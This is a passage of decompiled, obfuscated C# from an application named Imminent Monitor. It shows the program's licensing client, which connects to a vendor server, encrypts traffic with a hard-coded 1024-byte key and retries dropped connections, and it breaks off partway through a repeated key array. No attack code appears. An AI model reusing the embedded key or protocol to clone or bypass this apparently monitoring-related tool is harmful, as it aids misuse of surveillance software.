// Decompiled with JetBrains decompiler
// Type: GClass1
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using ImminentMonitor.Cef;
using LZLoader;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public sealed class GClass1
{
  private string string_0;
  private ushort ushort_0;
  private GClass33 gclass33_0;
  private int int_0;
  public GClass47 gclass47_0;
  public bool bool_0;
  private GClass35 gclass35_0;
  private Random random_0;
  private string string_1;
  private Dictionary<string, string> dictionary_0;
  private string string_2;
  private bool bool_1;
  private byte[] byte_0;
  private byte[] byte_1;
  public string string_3;
  private string string_4;
  private string string_5;

  [MethodImpl(MethodImplOptions.NoOptimization)]
  public GClass1(GClass35 gclass35_1)
  {
    this.string_0 = "ovh.imminentmethods.net";
    this.ushort_0 = (ushort) 8310;
    this.vmethod_1(new GClass33());
    this.gclass47_0 = new GClass47();
    this.bool_0 = false;
    this.random_0 = new Random();
    this.string_1 = Application.StartupPath + "\\bin\\cef\\locales\\temp.dat";
    this.dictionary_0 = new Dictionary<string, string>();
    this.string_2 = string.Empty;
    this.bool_1 = false;
    this.byte_1 = new byte[1024]
    {
      (byte) 186,
      (byte) 184,
      (byte) 211,
      (byte) 64,
      (byte) 210,
      (byte) 187,
      (byte) 64,
      (byte) 196,
      (byte) 156,
      (byte) 236,
      (byte) 204,
      (byte) 97,
      (byte) 53,
      (byte) 107,
      (byte) 154,
      (byte) 167,
      (byte) 84,
      (byte) 72,
      (byte) 72,
      (byte) 190,
      (byte) 140,
      (byte) 237,
      (byte) 246,
      (byte) 139,
      (byte) 231,
      (byte) 210,
      (byte) 72,
      (byte) 94,
      (byte) 201,
      (byte) 75,
      (byte) 235,
      (byte) 78,
      (byte) 253,
      (byte) 224,
      (byte) 155,
      (byte) 67,
      (byte) 142,
      (byte) 138,
      (byte) 100,
      (byte) 206,
      (byte) 160,
      (byte) 134,
      (byte) 142,
      (byte) 227,
      (byte) 241,
      (byte) 58,
      (byte) 129,
      (byte) 81,
      (byte) 232,
      (byte) 140,
      (byte) 124,
      (byte) 159,
      (byte) 160,
      (byte) 150,
      (byte) 125,
      (byte) 203,
      (byte) 193,
      (byte) 122,
      (byte) 87,
      (byte) 254,
      (byte) 165,
      (byte) 225,
      (byte) 250,
      (byte) 131,
      (byte) 50,
      (byte) 176,
      (byte) 98,
      (byte) 83,
      (byte) 206,
      (byte) 137,
      (byte) 74,
      (byte) 200,
      (byte) 226,
      (byte) 121,
      (byte) 79,
      (byte) 55,
      (byte) 145,
      (byte) 68,
      (byte) 152,
      (byte) 223,
      (byte) 131,
      (byte) 245,
      (byte) 116,
      (byte) 110,
      (byte) 205,
      (byte) 125,
      (byte) 173,
      (byte) 152,
      (byte) 149,
      (byte) 207,
      (byte) 128,
      (byte) 70,
      (byte) 101,
      (byte) 101,
      (byte) 91,
      (byte) 190,
      (byte) 139,
      (byte) 61,
      (byte) 226,
      (byte) 115,
      (byte) 214,
      (byte) 95,
      (byte) 130,
      (byte) 145,
      (byte) 116,
      (byte) 178,
      (byte) 187,
      (byte) 88,
      (byte) 120,
      (byte) 119,
      (byte) 108,
      (byte) 175,
      (byte) 224,
      (byte) 118,
      (byte) 172,
      (byte) 174,
      (byte) 158,
      (byte) 189,
      (byte) 181,
      (byte) 180,
      (byte) 53,
      (byte) 201,
      (byte) 189,
      (byte) 254,
      (byte) 58,
      (byte) 53,
      (byte) 149,
      (byte) 175,
      (byte) 80,
      (byte) 144,
      (byte) 171,
      (byte) 134,
      (byte) 96,
      (byte) 87,
      (byte) 59,
      (byte) 86,
      (byte) 165,
      (byte) 226,
      (byte) 249,
      (byte) 76,
      (byte) 192,
      (byte) 134,
      (byte) 81,
      (byte) 79,
      (byte) 148,
      (byte) 208,
      (byte) 100,
      (byte) 237,
      (byte) 183,
      (byte) 171,
      (byte) 81,
      (byte) 204,
      (byte) 134,
      (byte) 96,
      (byte) 112,
      (byte) 62,
      (byte) 160,
      (byte) 131,
      (byte) 136,
      (byte) 112,
      (byte) 79,
      (byte) 62,
      (byte) 58,
      (byte) 231,
      (byte) 203,
      (byte) 229,
      (byte) 128,
      (byte) 187,
      (byte) 109,
      (byte) 136,
      (byte) 59,
      (byte) 187,
      (byte) 195,
      (byte) 155,
      (byte) 242,
      (byte) 173,
      (byte) 169,
      (byte) 160,
      (byte) 155,
      (byte) 104,
      (byte) 207,
      (byte) 166,
      (byte) 246,
      (byte) 163,
      (byte) 112,
      (byte) 222,
      (byte) 254,
      (byte) 50,
      (byte) 230,
      (byte) 251,
      (byte) 180,
      (byte) 84,
      (byte) 139,
      (byte) 186,
      (byte) 251,
      (byte) 180,
      (byte) 125,
      (byte) 105,
      (byte) 130,
      (byte) 173,
      (byte) 129,
      (byte) 168,
      (byte) 177,
      (byte) 97,
      (byte) 162,
      (byte) 149,
      (byte) 59,
      (byte) 234,
      (byte) 108,
      (byte) 193,
      (byte) 148,
      (byte) 254,
      (byte) 230,
      (byte) 82,
      (byte) 159,
      (byte) 167,
      (byte) 70,
      (byte) 150,
      (byte) 168,
      (byte) 236,
      (byte) 230,
      (byte) 128,
      (byte) 212,
      (byte) 113,
      (byte) 210,
      (byte) 230,
      (byte) 97,
      (byte) 58,
      (byte) 158,
      (byte) 112,
      (byte) 98,
      (byte) 114,
      (byte) 79,
      (byte) 236,
      (byte) 229,
      (byte) 89,
      (byte) 243,
      (byte) 199,
      (byte) 51,
      (byte) 217,
      (byte) 212,
      (byte) 70,
      (byte) 196,
      (byte) 86,
      (byte) 153,
      (byte) 181,
      (byte) 108,
      (byte) 107,
      (byte) 76,
      (byte) 133,
      (byte) 159,
      (byte) 230,
      (byte) 191,
      (byte) 149,
      (byte) 198,
      (byte) 51,
      (byte) 210,
      (byte) 114,
      (byte) 141,
      (byte) 186,
      (byte) 102,
      (byte) 50,
      (byte) 125,
      (byte) 251,
      (byte) 145,
      (byte) 83,
      (byte) 224,
      (byte) 248,
      (byte) 107,
      (byte) 120,
      (byte) 179,
      (byte) 126,
      (byte) 148,
      (byte) 206,
      (byte) 73,
      (byte) 209,
      (byte) 186,
      (byte) 175,
      (byte) 215,
      (byte) 79,
      (byte) 171,
      (byte) 245,
      (byte) 237,
      (byte) 74,
      (byte) 208,
      (byte) 122,
      (byte) 178,
      (byte) 185,
      (byte) 87,
      (byte) 228,
      (byte) 134,
      (byte) 179,
      (byte) 107,
      (byte) 119,
      (byte) 165,
      (byte) 212,
      (byte) 199,
      (byte) 200,
      (byte) 196,
      (byte) 119,
      (byte) 211,
      (byte) 115,
      (byte) 254,
      (byte) 211,
      (byte) 209,
      (byte) 82,
      (byte) 131,
      (byte) 239,
      (byte) 126,
      (byte) 243,
      (byte) 119,
      (byte) 84,
      (byte) 154,
      (byte) 112,
      (byte) 65,
      (byte) 112,
      (byte) 68,
      (byte) 101,
      (byte) 93,
      (byte) 72,
      (byte) 160,
      (byte) 89,
      (byte) 210,
      (byte) 134,
      (byte) 241,
      (byte) 50,
      (byte) 69,
      (byte) 79,
      (byte) 91,
      (byte) 115,
      (byte) 60,
      (byte) 241,
      (byte) 233,
      (byte) 145,
      (byte) 123,
      (byte) 106,
      (byte) 245,
      (byte) 75,
      (byte) 120,
      (byte) 175,
      (byte) 246,
      (byte) 193,
      (byte) 108,
      (byte) 98,
      (byte) 158,
      (byte) 99,
      (byte) 74,
      (byte) 249,
      (byte) 103,
      (byte) 102,
      (byte) 194,
      (byte) 147,
      (byte) 156,
      (byte) 174,
      (byte) 214,
      (byte) 171,
      (byte) 159,
      (byte) 170,
      (byte) 225,
      (byte) 209,
      (byte) 63,
      (byte) 101,
      (byte) 198,
      (byte) 60,
      (byte) 233,
      (byte) 132,
      (byte) 105,
      (byte) 58,
      (byte) 243,
      (byte) 214,
      (byte) 122,
      (byte) 247,
      (byte) 236,
      (byte) 172,
      (byte) 81,
      (byte) 221,
      (byte) 235,
      (byte) 161,
      (byte) 230,
      (byte) 191,
      (byte) 230,
      (byte) 74,
      (byte) 230,
      (byte) 243,
      (byte) 176,
      (byte) 168,
      (byte) 134,
      (byte) 109,
      (byte) 186,
      (byte) 207,
      (byte) 201,
      (byte) 124,
      (byte) 105,
      (byte) 165,
      (byte) 162,
      (byte) 194,
      (byte) 249,
      (byte) 98,
      (byte) 120,
      (byte) 75,
      (byte) 248,
      (byte) 65,
      (byte) 55,
      (byte) 144,
      (byte) 235,
      (byte) 201,
      (byte) 166,
      (byte) 239,
      (byte) 143,
      (byte) 247,
      (byte) 190,
      (byte) 252,
      (byte) 194,
      (byte) 83,
      (byte) 234,
      (byte) 243,
      (byte) 126,
      (byte) 209,
      (byte) 138,
      (byte) 114,
      (byte) 252,
      (byte) 251,
      (byte) 127,
      (byte) 86,
      (byte) 62,
      (byte) 252,
      (byte) 192,
      (byte) 120,
      (byte) 60,
      (byte) 142,
      (byte) 227,
      (byte) 187,
      (byte) 90,
      (byte) 204,
      (byte) 198,
      (byte) 214,
      (byte) 68,
      (byte) 135,
      (byte) 58,
      (byte) 229,
      (byte) 51,
      (byte) 150,
      (byte) 221,
      (byte) 193,
      (byte) 66,
      (byte) 203,
      (byte) 184,
      (byte) 72,
      (byte) 186,
      (byte) 173,
      (byte) 117,
      (byte) 89,
      (byte) 214,
      (byte) 56,
      (byte) 77,
      (byte) 251,
      (byte) 193,
      (byte) 224,
      (byte) 132,
      (byte) 237,
      (byte) 59,
      (byte) 96,
      (byte) 228,
      (byte) 50,
      (byte) 70,
      (byte) 52,
      (byte) 211,
      (byte) 244,
      (byte) 139,
      (byte) 69,
      (byte) 224,
      (byte) 245,
      (byte) 201,
      (byte) 164,
      (byte) 113,
      (byte) 151,
      (byte) 80,
      (byte) 188,
      (byte) 69,
      (byte) 113,
      (byte) 118,
      (byte) 170,
      (byte) 188,
      (byte) 141,
      (byte) 74,
      (byte) 187,
      (byte) 228,
      (byte) 84,
      (byte) 176,
      (byte) 201,
      (byte) 71,
      (byte) 99,
      (byte) 53,
      (byte) 76,
      (byte) 220,
      (byte) 209,
      (byte) 177,
      (byte) 220,
      (byte) 173,
      (byte) 63,
      (byte) 247,
      (byte) 194,
      (byte) 187,
      (byte) 166,
      (byte) 204,
      (byte) 127,
      (byte) 143,
      (byte) 100,
      (byte) 197,
      (byte) 181,
      (byte) 221,
      (byte) 54,
      (byte) 204,
      (byte) 69,
      (byte) 169,
      (byte) 144,
      (byte) 162,
      (byte) 136,
      (byte) 231,
      (byte) 138,
      (byte) 79,
      (byte) 177,
      (byte) 118,
      (byte) 192,
      (byte) 253,
      (byte) 174,
      (byte) 241,
      (byte) 175,
      (byte) 198,
      (byte) 158,
      (byte) 229,
      (byte) 114,
      (byte) 65,
      (byte) 55,
      (byte) 121,
      (byte) 178,
      (byte) 237,
      (byte) 71,
      (byte) 192,
      (byte) 201,
      (byte) 93,
      (byte) 177,
      (byte) 142,
      (byte) 250,
      (byte) 235,
      (byte) 67,
      (byte) 150,
      (byte) 239,
      (byte) 161,
      (byte) 126,
      (byte) 97,
      (byte) 91,
      (byte) 244,
      (byte) 85,
      (byte) 239,
      (byte) 119,
      (byte) 126,
      (byte) 249,
      (byte) 168,
      (byte) 79,
      (byte) 141,
      (byte) 222,
      (byte) 156,
      (byte) 88,
      (byte) 206,
      (byte) 157,
      (byte) 243,
      (byte) 198,
      (byte) 202,
      (byte) 245,
      (byte) 161,
      (byte) 140,
      (byte) 198,
      (byte) 79,
      (byte) 94,
      (byte) 156,
      (byte) 84,
      (byte) 122,
      (byte) 212,
      (byte) 236,
      (byte) 74,
      (byte) 52,
      (byte) 63,
      (byte) 122,
      (byte) 111,
      (byte) 188,
      (byte) 125,
      (byte) 235,
      (byte) 71,
      (byte) 51,
      (byte) 102,
      (byte) 242,
      (byte) 158,
      (byte) 163,
      (byte) 110,
      (byte) 125,
      (byte) 71,
      (byte) 103,
      (byte) 94,
      (byte) 128,
      (byte) 78,
      (byte) 207,
      (byte) 86,
      (byte) 171,
      (byte) 219,
      (byte) 211,
      (byte) 147,
      (byte) 214,
      (byte) 246,
      (byte) 132,
      (byte) 84,
      (byte) 54,
      (byte) 87,
      (byte) 187,
      (byte) 54,
      (byte) 138,
      (byte) 209,
      (byte) 84,
      (byte) 232,
      (byte) 68,
      (byte) 81,
      (byte) 58,
      (byte) 176,
      (byte) 201,
      (byte) 193,
      (byte) 173,
      (byte) 237,
      (byte) 84,
      (byte) 224,
      (byte) 223,
      (byte) 135,
      (byte) 236,
      (byte) 77,
      (byte) 134,
      (byte) 208,
      (byte) 122,
      (byte) 221,
      (byte) 146,
      (byte) 158,
      (byte) 155,
      (byte) 90,
      (byte) 166,
      (byte) 244,
      (byte) 194,
      (byte) 221,
      (byte) 97,
      (byte) 205,
      (byte) 226,
      (byte) 159,
      (byte) 227,
      (byte) 171,
      (byte) 242,
      (byte) 125,
      (byte) 76,
      (byte) 96,
      (byte) 70,
      (byte) 80,
      (byte) 140,
      (byte) 233,
      (byte) 95,
      (byte) 228,
      (byte) 112,
      (byte) 244,
      (byte) 72,
      (byte) 251,
      (byte) 103,
      (byte) 231,
      (byte) 208,
      (byte) 234,
      (byte) 187,
      (byte) 172,
      (byte) 112,
      (byte) 180,
      (byte) 127,
      (byte) 232,
      (byte) 170,
      (byte) 68,
      (byte) 237,
      (byte) 234,
      (byte) 145,
      (byte) 223,
      (byte) 61,
      (byte) 180,
      (byte) 252,
      (byte) 101,
      (byte) 148,
      (byte) 160,
      (byte) 51,
      (byte) 87,
      (byte) 187,
      (byte) 91,
      (byte) 131,
      (byte) 168,
      (byte) 112,
      (byte) 181,
      (byte) 233,
      (byte) 176,
      (byte) 221,
      (byte) 197,
      (byte) 168,
      (byte) 120,
      (byte) 251,
      (byte) 247,
      (byte) 226,
      (byte) 104,
      (byte) 108,
      (byte) 111,
      (byte) 253,
      (byte) 99,
      (byte) 180,
      (byte) 51,
      (byte) 97,
      (byte) 160,
      (byte) 138,
      (byte) 127,
      (byte) 217,
      (byte) 186,
      (byte) 247,
      (byte) 225,
      (byte) 153,
      (byte) 197,
      (byte) 230,
      (byte) 170,
      (byte) 96,
      (byte) 145,
      (byte) 91,
      (byte) 199,
      (byte) 118,
      (byte) 200,
      (byte) 253,
      (byte) 249,
      (byte) 102,
      (byte) 90,
      (byte) 116,
      (byte) 74,
      (byte) 226,
      (byte) 69,
      (byte) 209,
      (byte) 197,
      (byte) 248,
      (byte) 87,
      (byte) 162,
      (byte) 207,
      (byte) 162,
      (byte) 186,
      (byte) 248,
      (byte) 225,
      (byte) 80,
      (byte) 240,
      (byte) 219,
      (byte) 96,
      (byte) 183,
      (byte) 250,
      (byte) 93,
      (byte) 225,
      (byte) 145,
      (byte) 131,
      (byte) 200,
      (byte) 130,
      (byte) 63,
      (byte) 164,
      (byte) 248,
      (byte) 102,
      (byte) 100,
      (byte) 185,
      (byte) 203,
      (byte) 57,
      (byte) 93,
      (byte) 113,
      (byte) 155,
      (byte) 197,
      (byte) 232,
      (byte) 100,
      (byte) 232,
      (byte) 116,
      (byte) 85,
      (byte) 73,
      (byte) 58,
      (byte) 164,
      (byte) 152,
      (byte) 120,
      (byte) 169,
      (byte) 132,
      (byte) 236,
      (byte) 207,
      (byte) 116,
      (byte) 106,
      (byte) 252,
      (byte) 146,
      (byte) 184,
      (byte) 145,
      (byte) 123,
      (byte) 128,
      (byte) 184,
      (byte) 134,
      (byte) 94,
      (byte) 109,
      (byte) 157,
      (byte) 231,
      (byte) 238,
      (byte) 241,
      (byte) 182,
      (byte) 221,
      (byte) 134,
      (byte) 71,
      (byte) 118,
      (byte) 133,
      (byte) 68,
      (byte) 232,
      (byte) 189,
      (byte) 122,
      (byte) 122,
      (byte) 86,
      (byte) 233,
      (byte) 197,
      (byte) 249,
      (byte) 165,
      (byte) 120,
      (byte) 147,
      (byte) 119,
      (byte) 147,
      (byte) 60,
      (byte) 201,
      (byte) 183,
      (byte) 60,
      (byte) 124,
      (byte) 153,
      (byte) 170,
      (byte) 148,
      (byte) 72,
      (byte) 231,
      (byte) 171,
      (byte) 81,
      (byte) 181,
      (byte) 165,
      (byte) 193,
      (byte) 202,
      (byte) 253,
      (byte) 214,
      (byte) 138,
      (byte) 238,
      (byte) 88,
      (byte) 69,
      (byte) 212,
      (byte) 112,
      (byte) 72,
      (byte) 86,
      (byte) 150,
      (byte) 241,
      (byte) 139,
      (byte) 183,
      (byte) 243,
      (byte) 59,
      (byte) 162,
      (byte) 140,
      (byte) 231,
      (byte) 235,
      (byte) 88,
      (byte) 124,
      (byte) 202,
      (byte) 219,
      (byte) 217,
      (byte) 174,
      (byte) 209,
      (byte) 213,
      (byte) 206,
      (byte) 91,
      (byte) 160,
      (byte) 117,
      (byte) 54,
      (byte) 97,
      (byte) 167,
      (byte) 160,
      (byte) 58,
      (byte) 135,
      (byte) 108,
      (byte) 245,
      (byte) 244,
      (byte) 121,
      (byte) 242,
      (byte) 87,
      (byte) 53,
      (byte) 184,
      (byte) 59,
      (byte) 143,
      (byte) 242,
      (byte) 161,
      (byte) 173,
      (byte) 90,
      (byte) 189,
      (byte) 212,
      (byte) 164,
      (byte) 178,
      (byte) 62,
      (byte) 173,
      (byte) 70,
      (byte) 169,
      (byte) 115,
      (byte) 254,
      (byte) 161,
      (byte) 236,
      (byte) 181,
      (byte) 82,
      (byte) 236,
      (byte) 91,
      (byte) 66,
      (byte) 132,
      (byte) 50,
      (byte) 76,
      (byte) 82,
      (byte) 240,
      (byte) 245,
      (byte) 221,
      (byte) 136,
      (byte) 164,
      (byte) 216,
      (byte) 83,
      (byte) 165,
      (byte) 116,
      (byte) 225,
      (byte) 94,
      (byte) 172,
      (byte) 120,
      (byte) 182,
      (byte) 97,
      (byte) 188,
      (byte) 243,
      (byte) 148,
      (byte) 140,
      (byte) 115,
      (byte) 194,
      (byte) 180,
      (byte) 245,
      (byte) 214,
      (byte) 56,
      (byte) 161,
      (byte) 225,
      (byte) 202,
      (byte) 222,
      (byte) 126,
      (byte) 159,
      (byte) 161,
      (byte) 147,
      (byte) 58,
      (byte) 204,
      (byte) 221,
      (byte) 197,
      (byte) 92,
      (byte) 152,
      (byte) 212,
      (byte) 242,
      (byte) 54,
      (byte) 253,
      (byte) 78,
      (byte) 116,
      (byte) 113,
      (byte) 110,
      (byte) 155,
      (byte) 189,
      (byte) 158,
      (byte) 78,
      (byte) 239,
      (byte) 165,
      (byte) 216,
      (byte) 142,
      (byte) 110,
      (byte) 50,
      (byte) 56,
      (byte) 129,
      (byte) 53,
      (byte) 245,
      (byte) 136,
      (byte) 197,
      (byte) 244,
      (byte) 115,
      (byte) 188,
      (byte) 75,
      (byte) 112,
      (byte) 233,
      (byte) 130,
      (byte) 245,
      (byte) 201,
      (byte) 250,
      (byte) 182,
      (byte) 128,
      (byte) 190,
      (byte) 181,
      (byte) 216,
      (byte) 148,
      (byte) 197,
      (byte) 100,
      (byte) 120,
      (byte) 62,
      (byte) 113,
      (byte) 98,
      (byte) 175,
      (byte) 250,
      (byte) 185,
      (byte) 170,
      (byte) 143,
      (byte) 221,
      (byte) 190,
      (byte) 217,
      (byte) 149,
      (byte) 221,
      (byte) 155,
      (byte) 111,
      (byte) 59,
      (byte) 218,
      (byte) 183,
      (byte) 88,
      (byte) 253,
      (byte) 176,
      (byte) 109,
      (byte) 168,
      (byte) 132,
      (byte) 243,
      (byte) 237,
      (byte) 138,
      (byte) 207,
      (byte) 184,
      (byte) 89,
      (byte) 163,
      (byte) 187
    };
    this.string_5 = (string) null;
    try
    {
      this.gclass35_0 = gclass35_1;
      Class97.gclass1_0 = this;
      this.method_1();
      this.method_0();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception = ex;
      int num = (int) new FormException("[Exception] " + exception.Message + exception.StackTrace + "\r\n\r\n\r\n").ShowDialog();
      ProjectData.EndApp();
      ProjectData.ClearProjectError();
    }
  }

  public virtual GClass33 vmethod_0() => this.gclass33_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public virtual void vmethod_1(GClass33 gclass33_1)
  {
    GClass33.GDelegate17 gdelegate17_1 = new GClass33.GDelegate17(this.method_5);
    GClass33.GDelegate16 gdelegate16_1 = new GClass33.GDelegate16(this.method_4);
    if (this.gclass33_0 != null)
    {
      this.gclass33_0.method_1(gdelegate17_1);
      this.gclass33_0.method_3(gdelegate16_1);
    }
    this.gclass33_0 = gclass33_1;
    if (this.gclass33_0 == null)
      return;
    this.gclass33_0.method_0(gdelegate17_1);
    this.gclass33_0.method_2(gdelegate16_1);
  }

  private void method_0()
  {
    object[] object_3 = new object[1]{ (object) this };
    Class86.smethod_0().method_68(Class86.smethod_1(), "8,8=3Pa.Q$", object_3);
  }

  private void method_1() => this.vmethod_0().method_13(this.string_0, this.ushort_0);

  private object[] method_2(GClass33 gclass33_1, object[] object_0)
  {
    if (gclass33_1 == null)
      return (object[]) null;
    if (object_0 == null)
      return (object[]) null;
    byte[] byte_6 = dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_0(this.gclass47_0.method_0(object_0), this.byte_1);
    return gclass33_1.method_17(byte_6);
  }

  private void method_3(GClass33 gclass33_1, object[] object_0)
  {
    if (gclass33_1 == null || object_0 == null)
      return;
    byte[] byte_6 = dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_0(this.gclass47_0.method_0(object_0), this.byte_1);
    gclass33_1.method_20(byte_6);
  }

  private void method_4(GClass33 gclass33_1, byte[] byte_2)
  {
    try
    {
      byte_2 = dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_0(byte_2, this.byte_1);
      if (byte_2 != null)
      {
        object[] object_0 = this.gclass47_0.method_1(byte_2);
        if (object_0 != null)
        {
          Class93.LicensePacket licensePacket_0 = (Class93.LicensePacket) object_0[0];
          this.method_7(this.vmethod_0(), licensePacket_0, object_0);
        }
        else
          this.vmethod_0().method_21();
      }
      else
        this.vmethod_0().method_21();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      this.vmethod_0().method_21();
      ProjectData.ClearProjectError();
    }
  }

  private void method_5(GClass33 gclass33_1, bool bool_2)
  {
    if (bool_2)
    {
      this.int_0 = 0;
      if (!Class97.bool_1)
        return;
      Class97.gclass2_0.method_0("[Licensing] Connection to licensing server re-established, authenticating session...", Class97.gclass2_0.textStyle_0);
    }
    else if (Class97.bool_1)
    {
      if (this.int_0 == 0)
        Class97.gclass2_0.method_0("[Licensing] Lost connection to licensing server!", Class97.gclass2_0.textStyle_3);
      this.method_6();
    }
    else if (Class93.formLogin_0 == null)
    {
      int num = (int) new FormException("Imminent Monitor was unable to connect to the licensing server! Please check that your internet is connected.\r\n\r\nIf your internet is connected please check your firewall/anti-virus isn't blocking Imminent Monitors connection!\r\n\r\nIf everything seems fine from your end, our licensing server may be down! To report this please visit https://help.imminentmethods.net and submit a ticket!").ShowDialog();
      Process.GetCurrentProcess().Kill();
    }
    else
    {
      int num = (int) new FormException("Imminent Monitor was unable to connect to the licensing server! Please check that your internet is connected.\r\n\r\nIf your internet is connected please check your firewall/anti-virus isn't blocking Imminent Monitors connection!\r\n\r\nIf everything seems fine from your end, our licensing server may be down! To report this please visit https://help.imminentmethods.net and submit a ticket!").ShowDialog();
      Class93.formLogin_0.Invoke((Delegate) (() => Class93.formLogin_0.method_12()));
    }
  }

  private void method_6()
  {
    Thread.Sleep(2000);
    ++this.int_0;
    Class97.gclass2_0.method_0(string.Format("[Licensing] Attempting to reconnect to licensing server... (Attempt {0} of 60)", (object) this.int_0), Class97.gclass2_0.textStyle_2);
    if (this.int_0 >= 60)
    {
      int num;
      Class97.formMain_0.Invoke((Delegate) (() => num = (int) MessageBox.Show("Connection Lost, please restart", "Session lost", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)));
      Class97.formMain_0.Invoke((Delegate) (() => Class97.formMain_0.method_15()));
    }
    else
    {
      this.byte_1 = new byte[1024]
      {
        (byte) 186,
        (byte) 184,
        (byte) 211,
        (byte) 64,
        (byte) 210,
        (byte) 187,
        (byte) 64,
        (byte) 196,
        (byte) 156,
        (byte) 236,
        (byte) 204,
        (byte) 97,
        (byte) 53,
        (byte) 107,
        (byte) 154,
        (byte) 167,
        (byte) 84,
        (byte) 72,
        (byte) 72,
        (byte) 190,
        (byte) 140,
        (byte) 237,
        (byte) 246,
        (byte) 139,
        (byte) 231,
        (byte) 210,
        (byte) 72,
        (byte) 94,
        (byte) 201,
        (byte) 75,
        (byte) 235,
        (byte) 78,
        (byte) 253,
        (byte) 224,
        (byte) 155,
        (byte) 67,
        (byte) 142,
        (byte) 138,
        (byte) 100,
        (byte) 206,
        (byte) 160,
        (byte) 134,
        (byte) 142,
        (byte) 227,
        (byte) 241,
        (byte) 58,
        (byte) 129,
        (byte) 81,
        (byte) 232,
        (byte) 140,
        (byte) 124,
        (byte) 159,
        (byte) 160,
        (byte) 150,
        (byte) 125,
        (byte) 203,
        (byte) 193,
        (byte) 122,
        (byte) 87,
        (byte) 254,
        (byte) 165,
        (byte) 225,
        (byte) 250,
        (byte) 131,
        (byte) 50,
        (byte) 176,
        (byte) 98,
        (byte) 83,
        (byte) 206,
        (byte) 137,
        (byte) 74,
        (byte) 200,
        (byte) 226,
        (byte) 121,
        (byte) 79,
        (byte) 55,
        (byte) 145,
        (byte) 68,
        (byte) 152,
        (byte) 223,
        (byte) 131,
        (byte) 245,
        (byte) 116,
        (byte) 110,
        (byte) 205,
        (byte) 125,
        (byte) 173,
        (byte) 152,
        (byte) 149,
        (byte) 207,
        (byte) 128,
        (byte) 70,
        (byte) 101,
        (byte) 101,
        (byte) 91,
        (byte) 190,
        (byte) 139,
        (byte) 61,
        (byte) 226,
        (byte) 115,
        (byte) 214,
        (byte) 95,
        (byte) 130,
        (byte) 145,
        (byte) 116,
        (byte) 178,
        (byte) 187,
        (byte) 88,
        (byte) 120,
        (byte) 119,
        (byte) 108,
        (byte) 175,
        (byte) 224,
        (byte) 118,
        (byte) 172,
        (byte) 174,
        (byte) 158,
        (byte) 189,
        (byte) 181,
        (byte) 180,
        (byte) 53,
        (byte) 201,
        (byte) 189,
        (byte) 254,
        (byte) 58,
        (byte) 53,
        (byte) 149,
        (byte) 175,
        (byte) 80,
        (byte) 144,
        (byte) 171,
        (byte) 134,
        (byte) 96,
        (byte) 87,
        (byte) 59,
        (byte) 86,
        (byte) 165,
        (byte) 226,
        (byte) 249,
        (byte) 76,
        (byte) 192,
        (byte) 134,
        (byte) 81,
        (byte) 79,
        (byte) 148,
        (byte) 208,
        (byte) 100,
        (byte) 237,
        (byte) 183,
        (byte) 171,
        (byte) 81,
        (byte) 204,
        (byte) 134,
        (byte) 96,
        (byte) 112,
        (byte) 62,
        (byte) 160,
        (byte) 131,
        (byte) 136,
        (byte) 112,
        (byte) 79,
        (byte) 62,
        (byte) 58,
        (byte) 231,
        (byte) 203,
        (byte) 229,
        (byte) 128,
        (byte) 187,
        (byte) 109,
        (byte) 136,
        (byte) 59,
        (byte) 187,
        (byte) 195,
        (byte) 155,
        (byte) 242,
        (byte) 173,
        (byte) 169,
        (byte) 160,
        (byte) 155,
        (byte) 104,
        (byte) 207,
        (byte) 166,
        (byte) 246,
        (byte) 163,
        (byte) 112,
        (byte) 222,
        (byte) 254,
        (byte) 50,
        (byte) 230,
        (byte) 251,
        (byte) 180,
        (byte) 84,
        (byte) 139,
        (byte) 186,
        (byte) 251,
        (byte) 180,
        (byte) 125,
        (byte) 105,
        (byte) 130,
        (byte) 173,
        (byte) 129,
        (byte) 168,
        (byte) 177,
        (byte) 97,
        (byte) 162,
        (byte) 149,
        (byte) 59,
        (byte) 234,
        (byte) 108,
        (byte) 193,
        (byte) 148,
        (byte) 254,
        (byte) 230,
        (byte) 82,
        (byte) 159,
        (byte) 167,
        (byte) 70,
        (byte) 150,
        (byte) 168,
        (byte) 236,
        (byte) 230,
        (byte) 128,
        (byte) 212,
        (byte) 113,
        (byte) 210,
        (byte) 230,
        (byte) 97,
        (byte) 58,
        (byte) 158,
        (byte) 112,
        (byte) 98,
        (byte) 114,
        (byte) 79,
        (byte) 236,
        (byte) 229,
        (byte) 89,
        (byte) 243,
        (byte) 199,
        (byte) 51,
        (byte) 217,
        (byte) 212,
        (byte) 70,
        (byte) 196,
        (byte) 86,
        (byte) 153,
        (byte) 181,
        (byte) 108,
        (byte) 107,
        (byte) 76,
        (byte) 133,
        (byte) 159,
        (byte) 230,
        (byte) 191,
        (byte) 149,
        (byte) 198,
        (byte) 51,
        (byte) 210,
        (byte) 114,
        (byte) 141,
        (byte) 186,
        (byte) 102,
        (byte) 50,
        (byte) 125,
        (byte) 251,
        (byte) 145,
        (byte) 83,
        (byte) 224,
        (byte) 248,
        (byte) 107,
        (byte) 120,
        (byte) 179,
        (byte) 126,
        (byte) 148,
        (byte) 206,
        (byte) 73,
        (byte) 209,
        (byte) 186,
        (byte) 175,
        (byte) 215,
        (byte) 79,
        (byte) 171,
        (byte) 245,
        (byte) 237,
        (byte) 74,
        (byte) 208,
        (byte) 122,
        (byte) 178,
        (byte) 185,
        (byte) 87,
        (byte) 228,
        (byte) 134,
        (byte) 179,
        (byte) 107,
        (byte) 119,
        (byte) 165,
        (byte) 212,
        (byte) 199,
        (byte) 200,
        (byte) 196,
